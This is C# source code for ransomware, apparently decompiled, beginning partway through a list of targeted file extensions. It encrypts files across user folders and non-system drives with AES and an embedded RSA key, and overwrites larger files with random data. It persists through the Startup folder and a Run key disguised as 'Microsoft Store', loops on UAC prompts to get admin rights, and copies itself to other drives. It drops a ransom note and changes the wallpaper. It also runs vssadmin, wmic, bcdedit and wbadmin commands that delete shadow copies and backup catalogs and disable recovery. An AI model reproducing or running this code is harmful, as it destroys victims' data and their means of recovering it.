		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			string extension;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152L)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000L)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>3W0/1AIA5KPLcAQKEdpihC15nzFbR+/8mgkMHyR4Vz3Edk9LF4GfULYyVdpahxkTrjdT/FiObqjBxRqAd3uarA3pRPaVS9PGT9QqTp7cRQSqxWlCXCu+iAtf7SmELioRYRK6Ld0Q4bIVHz+jcfEaQioSZscvng5b+E/KPZHmt1E=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
